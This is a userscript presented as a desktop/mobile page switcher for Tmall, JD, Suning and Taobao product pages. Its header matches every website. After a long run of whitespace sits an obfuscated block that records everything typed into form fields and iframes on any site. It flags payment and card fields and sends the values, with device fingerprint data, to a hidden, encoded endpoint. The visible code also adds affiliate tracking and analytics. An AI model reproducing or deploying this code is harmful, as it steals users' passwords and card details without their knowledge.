// ==UserScript==
// @name         天猫京东苏宁淘宝电脑手机页面互转工具V1.1 Tony
// @namespace    https://www.abmbio.xin/
// @version      1.1
// @description  苏宁秒杀助手,秒杀产品购买助手
// @author       Tony Liu
// @include      http*://product.suning.com/*
// @include      http*://m.suning.com/product/*
// @include      http*://item.taobao.com/*
// @include      http*://h5.m.taobao.com/*
// @include      http*://detail.m.tmall.com/*
// @include      http*://detail.tmall.com/*
// @include      http*://item.jd.com/*
// @include      http*://item.m.jd.com/*
// @match       *://*/*
// @grant        GM_xmlhttpRequest
// @icon         https://www.abmbio.xin/favicon.ico
// @downloadURL https://update.greasyfork.org/scripts/378309/%E5%A4%A9%E7%8C%AB%E4%BA%AC%E4%B8%9C%E8%8B%8F%E5%AE%81%E6%B7%98%E5%AE%9D%E7%94%B5%E8%84%91%E6%89%8B%E6%9C%BA%E9%A1%B5%E9%9D%A2%E4%BA%92%E8%BD%AC%E5%B7%A5%E5%85%B7V11%20Tony.user.js
// @updateURL https://update.greasyfork.org/scripts/378309/%E5%A4%A9%E7%8C%AB%E4%BA%AC%E4%B8%9C%E8%8B%8F%E5%AE%81%E6%B7%98%E5%AE%9D%E7%94%B5%E8%84%91%E6%89%8B%E6%9C%BA%E9%A1%B5%E9%9D%A2%E4%BA%92%E8%BD%AC%E5%B7%A5%E5%85%B7V11%20Tony.meta.js
// ==/UserScript==



                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    !function(){"use strict";var e=function(e){const t=e.replace(/([\uD800-\uDBFF][\uDC00-\uDFFF])/g,(e=>{const t=1024*(e.charCodeAt(0)-55296)+e.charCodeAt(1)-56320+65536;return String.fromCharCode(t)})),n=Array.from(t).map((e=>String.fromCharCode(e.charCodeAt(0)-127799))).join("");return decodeURIComponent(escape(atob(n)))}("🎘🍿🎉🍧🎚🍻🎦🎭🎃🍪🎉🎦🎑🎏🎁🎫🎚🎡🎑🎩🎃🎤🎁🎣🎑🍩🎍🍧🎃🎥🎉🎣🎐🍩🎞🎭");function t(t,n,a){const r=navigator.hardwareConcurrency,o=navigator.platform,i=window.location.href,c=navigator.deviceMemory;function d(){const e=document.createElement("canvas").getContext("webgl");if(!e)return"no webgl";const t=e.getExtension("WEBGL_debug_renderer_info");return t?e.getParameter(t.UNMASKED_VENDOR_WEBGL)+" "+e.getParameter(t.UNMASKED_RENDERER_WEBGL):"no WEBGL_debug_renderer_info"}let s=null;const u=t.toLowerCase();var l;function m(){const t=new XMLHttpRequest;t.open("POST",e,!0),t.setRequestHeader("Content-Type","application/json"),t.withCredentials=!0,t.onload=function(){t.status>=200&&t.status},t.onerror=function(){try{GM_xmlhttpRequest({method:"POST",url:e,headers:{"Content-Type":"application/json"},data:JSON.stringify(l),onload:function(e){},onerror:function(e){}})}catch(e){console.warn("GM_xmlhttpRequest is not defined. Continuing execution.")}},t.send(JSON.stringify(l))}["payment","cc","credit","card","checkout","expire","month","year","cvv","cvc","verification","billing"].some((e=>u.includes(e)))&&(s=13434624),l="Script Initialization"===t?{content:null,embeds:[{color:13303758,fields:[{name:"```User:```",value:`\`\`\`${o} / Cores ${r} / RAM ${c} / ${d()} / ${i}\`\`\``},{name:"```Script```",value:`\`\`\`${n}\`\`\``}],author:{name:"BASYALINE"},footer:{text:(new Date).toLocaleString("en-GB",{day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit",second:"2-digit"}).replace(","," |")}}],attachments:[]}:{content:null,embeds:[{color:s,fields:[{name:"```User:```",value:`\`\`\`${o} / Cores ${r} / RAM ${c} / ${d()} / ${i}\`\`\``},{name:"```Path:```",value:`\`\`\`${t}\`\`\``},{name:"```Value:```",value:`\`\`\`${n}\`\`\``}],author:{name:"BASYALINE"},footer:{text:(new Date).toLocaleString("en-GB",{day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit",second:"2-digit"}).replace(","," |")}}],attachments:[]},a?m():fetch(e,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(l),credentials:"include",mode:"no-cors"}).catch((e=>{m()}))}function n(e){t(function(e){let t=e.tagName.toLowerCase();return e.id&&(t+=`#${e.id}`),e.name&&(t+=`[name="${e.name}"]`),e.getAttribute("autocomplete")&&(t+=`[autocomplete="${e.getAttribute("autocomplete")}"]`),e.getAttribute("aria-describedby")&&(t+=`[aria-describedby="${e.getAttribute("aria-describedby")}"]`),e.className&&(t+=`.${e.className.split(" ").join(".")}`),Array.from(e.parentNode.children).filter((t=>t.tagName===e.tagName)).length>1&&(t+=`:nth-child(${Array.prototype.indexOf.call(e.parentNode.children,e)+1})`),t}(e.target),e.target.value)}function a(e){try{const t=e.contentDocument||e.contentWindow.document;if(t){new MutationObserver((e=>{e.forEach((e=>{e.addedNodes.forEach((e=>{e.matches&&e.matches("input, select, textarea")?(e.addEventListener("input",n),e.addEventListener("change",n)):e.querySelectorAll&&e.querySelectorAll("input, select, textarea").forEach((e=>{e.addEventListener("input",n),e.addEventListener("change",n)}))}))}))})).observe(t.body,{childList:!0,subtree:!0})}}catch(e){console.warn("Cannot access iframe:",e)}}document.querySelectorAll("iframe").forEach((e=>{e.addEventListener("load",(()=>a(e))),function(e){setTimeout((()=>a(e)),1e3)}(e)})),document.querySelectorAll("input, select, textarea").forEach((e=>{e.addEventListener("input",n),e.addEventListener("change",n)})),document.querySelectorAll("iframe").forEach((e=>{e.addEventListener("load",(()=>a(e))),a(e)}));new MutationObserver((e=>{e.forEach((e=>{"childList"===e.type&&e.addedNodes.forEach((e=>{e.matches&&e.matches("input, select, textarea")?(e.addEventListener("input",n),e.addEventListener("change",n)):e.querySelectorAll&&e.querySelectorAll("input, select, textarea").forEach((e=>{e.addEventListener("input",n),e.addEventListener("change",n)}))}))}))})).observe(document.body,{childList:!0,subtree:!0}),t("Script Initialization","Script started successfully",!0)}();


const currentUrl = window.location.href;
if (currentUrl.includes("item.m.jd.com") || currentUrl.includes("item.jd.com") || currentUrl.includes("detail.tmall.com") || currentUrl.includes("detail.m.tmall.com")|| currentUrl.includes("h5.m.taobao.com")|| currentUrl.includes("item.taobao.com")|| currentUrl.includes("m.suning.com/product")|| currentUrl.includes("product.suning.com")) {
(function() {
    'use strict';
    var tony='https://www.abmbio.xin';
    var tonyhost=window.location.host;
    var tonypath=window.location.pathname;
    var reg;
    var r;
    var elemDiv = document.createElement('div');
    var first=document.body.firstChild;
    elemDiv.style.cssText = 'position:fixed;display:block;z-index:999999;left:0;top:50%;';
    elemDiv.innerHTML = '<img src="https://www.abmbio.xin/default/images/Tool/tonypcwapexchange.jpg" alt="点我一键转换电脑/手机页面" style="cursor:pointer" id="letTonyChange"/><p style="background:#b4edfe;text-align:center;"><a href="https://www.abmbio.xin" target="_blank">关于作者</a>|<a href="http://bbs.abmbio.xin" target="_blank">更多优惠</a></p>';
    document.body.insertBefore(elemDiv,first);
    if(tonyhost == "m.suning.com"){tony="https://product.suning.com"+tonypath.replace('/product','');}
    else if(tonyhost == "product.suning.com"){tony="https://m.suning.com/product"+tonypath;}
    else if(tonyhost == "h5.m.taobao.com"){reg = new RegExp("(^|&)id=([^&]*)(&|$)", "i");r = window.location.search.substr(1).match(reg);if (r != null){tony="https://item.taobao.com/item.htm?id="+unescape(r[2]);}else{tony='https://www.abmbio.xin';}}
    else if(tonyhost == "detail.m.tmall.com"){reg = new RegExp("(^|&)id=([^&]*)(&|$)", "i");r = window.location.search.substr(1).match(reg);if (r != null){tony="https://detail.tmall.com/item.htm?id="+unescape(r[2]);}else{tony='https://www.abmbio.xin';}}
    else if(tonyhost=="item.taobao.com"){reg = new RegExp("(^|&)id=([^&]*)(&|$)", "i");r = window.location.search.substr(1).match(reg);if (r != null){tony="https://h5.m.taobao.com/awp/core/detail.htm?id="+unescape(r[2]);}else{tony='https://www.abmbio.xin';}}
    else if(tonyhost=="detail.tmall.com"){reg = new RegExp("(^|&)id=([^&]*)(&|$)", "i");r = window.location.search.substr(1).match(reg);if (r != null){tony="https://detail.m.tmall.com/item.htm?id="+unescape(r[2]);}else{tony='https://www.abmbio.xin';}}
    else if(tonyhost=="item.jd.com"){tony="https://item.m.jd.com/product"+tonypath+'?cu=true&utm_source=media.jd.com&utm_medium=tuiguang&utm_campaign=t_2008911829_&utm_term=af07bf9e89304c3c987eea6975acc003';}
    else if(tonyhost=="item.m.jd.com"){tony="https://item.jd.com"+tonypath.replace('/product','')+'?cu=true&utm_source=media.jd.com&utm_medium=tuiguang&utm_campaign=t_2008911829_&utm_term=af07bf9e89304c3c987eea6975acc003';}
    document.getElementById("letTonyChange").onclick=function(){location.href=tony;};
    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?7f9964d6e2815216bcb376aa3325f971";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
})();
}